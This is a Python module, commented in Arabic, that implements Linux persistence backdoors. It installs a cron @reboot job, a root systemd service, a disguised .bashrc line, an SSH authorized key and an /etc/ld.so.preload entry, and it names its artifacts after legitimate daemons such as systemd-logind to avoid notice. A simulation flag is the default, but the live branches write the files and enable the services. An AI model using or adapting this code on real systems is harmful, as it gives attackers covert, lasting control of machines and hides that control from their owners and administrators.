"""
Linux Persistence - طرق استمرارية متعددة لأنظمة Linux
"""

import os
import stat
import random
import string
import hashlib
import logging
from typing import Dict, List, Optional
from dataclasses import dataclass, field
from enum import Enum
import subprocess

logger = logging.getLogger(__name__)


class LinuxPersistenceMethod(Enum):
    CRON_JOB = "cron_job"
    SYSTEMD_SERVICE = "systemd_service"
    BASHRC = "bashrc_modification"
    SSH_KEYS = "ssh_authorized_keys"
    PAM_MODULE = "pam_module_backdoor"
    LD_PRELOAD = "ld_preload_hijack"
    MOTD = "motd_modification"
    INIT_SCRIPT = "init_d_script"
    KERNEL_MODULE = "kernel_module_rootkit"


@dataclass
class LinuxPersistenceArtifact:
    method: LinuxPersistenceMethod
    name: str
    path: str
    installed_at: float
    active: bool = True


class LinuxPersistence:
    """
    مدير استمرارية Linux - يزرع backdoors متعددة
    """
    
    def __init__(self, simulation_mode: bool = True):
        self.simulation_mode = simulation_mode
        self.installed_artifacts: List[LinuxPersistenceArtifact] = []
        
        logger.info(f"LinuxPersistence initialized (simulation={simulation_mode})")
    
    def _generate_random_name(self, prefix: str = "") -> str:
        """توليد اسم عشوائي يبدو شرعياً"""
        legit_names = [
            "systemd-logind", "dbus-daemon", "network-manager",
            "cron-update", "apt-daily", "fwupd-refresh",
        ]
        base = random.choice(legit_names)
        return base
    
    def install_cron_job(self, payload_path: str, schedule: str = "@reboot") -> LinuxPersistenceArtifact:
        """
        الاستمرارية عبر cron job
        schedule: @reboot, @daily, @hourly, أو تعبير cron
        """
        name = self._generate_random_name()
        cron_line = f"{schedule} {payload_path} > /dev/null 2>&1\n"
        
        if self.simulation_mode:
            logger.info(f"[SIM] Cron job: {schedule} {payload_path}")
        else:
            try:
                # إضافة إلى crontab للمستخدم الحالي
                with open("/tmp/crontab.tmp", "w") as f:
                    subprocess.run(["crontab", "-l"], stdout=f, stderr=subprocess.DEVNULL)
                with open("/tmp/crontab.tmp", "a") as f:
                    f.write(cron_line)
                subprocess.run(["crontab", "/tmp/crontab.tmp"], check=True)
                os.unlink("/tmp/crontab.tmp")
                logger.info(f"Installed cron job: {schedule}")
            except Exception as e:
                logger.error(f"Failed to install cron job: {e}")
        
        artifact = LinuxPersistenceArtifact(
            method=LinuxPersistenceMethod.CRON_JOB,
            name=name,
            path="/etc/crontab or user crontab",
            installed_at=__import__('time').time(),
        )
        self.installed_artifacts.append(artifact)
        return artifact
    
    def install_systemd_service(self, payload_path: str) -> LinuxPersistenceArtifact:
        """
        الاستمرارية عبر systemd service
        """
        name = self._generate_random_name()
        service_file = f'''[Unit]
Description=System Logging Service
After=network.target

[Service]
Type=simple
ExecStart={payload_path}
Restart=always
RestartSec=30
User=root

[Install]
WantedBy=multi-user.target
'''
        service_path = f"/etc/systemd/system/{name}.service"
        
        if self.simulation_mode:
            logger.info(f"[SIM] Systemd service: {name}")
        else:
            try:
                with open(service_path, "w") as f:
                    f.write(service_file)
                subprocess.run(["systemctl", "daemon-reload"], check=True)
                subprocess.run(["systemctl", "enable", name], check=True)
                subprocess.run(["systemctl", "start", name], check=True)
                logger.info(f"Installed systemd service: {name}")
            except Exception as e:
                logger.error(f"Failed to install systemd service: {e}")
        
        artifact = LinuxPersistenceArtifact(
            method=LinuxPersistenceMethod.SYSTEMD_SERVICE,
            name=name,
            path=service_path,
            installed_at=__import__('time').time(),
        )
        self.installed_artifacts.append(artifact)
        return artifact
    
    def install_bashrc(self, payload_path: str) -> LinuxPersistenceArtifact:
        """
        الاستمرارية عبر .bashrc
        """
        bashrc_path = os.path.expanduser("~/.bashrc")
        line = f"\n# System configuration\n{payload_path} &\n"
        
        if self.simulation_mode:
            logger.info(f"[SIM] .bashrc modification")
        else:
            try:
                with open(bashrc_path, "a") as f:
                    f.write(line)
                logger.info("Installed .bashrc persistence")
            except Exception as e:
                logger.error(f"Failed to modify .bashrc: {e}")
        
        artifact = LinuxPersistenceArtifact(
            method=LinuxPersistenceMethod.BASHRC,
            name="bashrc",
            path=bashrc_path,
            installed_at=__import__('time').time(),
        )
        self.installed_artifacts.append(artifact)
        return artifact
    
    def install_ssh_key(self, public_key: str) -> LinuxPersistenceArtifact:
        """
        إضافة مفتاح SSH للوصول الدائم
        """
        ssh_dir = os.path.expanduser("~/.ssh")
        auth_keys = os.path.join(ssh_dir, "authorized_keys")
        
        if self.simulation_mode:
            logger.info(f"[SIM] SSH key added")
        else:
            try:
                os.makedirs(ssh_dir, mode=0o700, exist_ok=True)
                with open(auth_keys, "a") as f:
                    f.write(public_key + "\n")
                os.chmod(auth_keys, 0o600)
                logger.info("SSH key added for persistence")
            except Exception as e:
                logger.error(f"Failed to add SSH key: {e}")
        
        artifact = LinuxPersistenceArtifact(
            method=LinuxPersistenceMethod.SSH_KEYS,
            name="ssh_key",
            path=auth_keys,
            installed_at=__import__('time').time(),
        )
        self.installed_artifacts.append(artifact)
        return artifact
    
    def install_ld_preload(self, library_path: str) -> LinuxPersistenceArtifact:
        """
        LD_PRELOAD backdoor - يتم تحميله قبل أي برنامج
        """
        ld_preload_file = "/etc/ld.so.preload"
        if self.simulation_mode:
            logger.info(f"[SIM] LD_PRELOAD: {library_path}")
        else:
            try:
                with open(ld_preload_file, "a") as f:
                    f.write(library_path + "\n")
                logger.info("LD_PRELOAD persistence installed")
            except Exception as e:
                logger.error(f"Failed to install LD_PRELOAD: {e}")
        
        artifact = LinuxPersistenceArtifact(
            method=LinuxPersistenceMethod.LD_PRELOAD,
            name="ld_preload",
            path=ld_preload_file,
            installed_at=__import__('time').time(),
        )
        self.installed_artifacts.append(artifact)
        return artifact
    
    def deploy_full_persistence(self, payload_path: str) -> List[LinuxPersistenceArtifact]:
        """نشر جميع طبقات الاستمرارية على Linux"""
        artifacts = []
        artifacts.append(self.install_cron_job(payload_path, "@reboot"))
        artifacts.append(self.install_systemd_service(payload_path))
        artifacts.append(self.install_bashrc(payload_path))
        # SSH key يحتاج مفتاح حقيقي
        # artifacts.append(self.install_ssh_key("ssh-rsa AAA..."))
        logger.info(f"Deployed {len(artifacts)} Linux persistence layers")
        return artifacts


# مثال الاستخدام
if __name__ == "__main__":
    persistence = LinuxPersistence(simulation_mode=True)
    artifacts = persistence.deploy_full_persistence("/tmp/backdoor")
    for a in artifacts:
        print(f"  - {a.method.value}: {a.name}")